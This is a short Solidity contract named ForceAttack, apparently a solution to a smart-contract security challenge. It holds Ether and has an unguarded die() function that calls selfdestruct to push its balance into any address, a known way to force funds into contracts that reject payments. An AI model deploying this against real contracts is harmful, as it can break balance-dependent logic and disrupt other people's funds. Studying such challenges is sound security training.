// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {

    constructor() public payable { }

    receive() external payable{}

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function die(address _recipient) public {
        selfdestruct(payable(_recipient));
    }
}
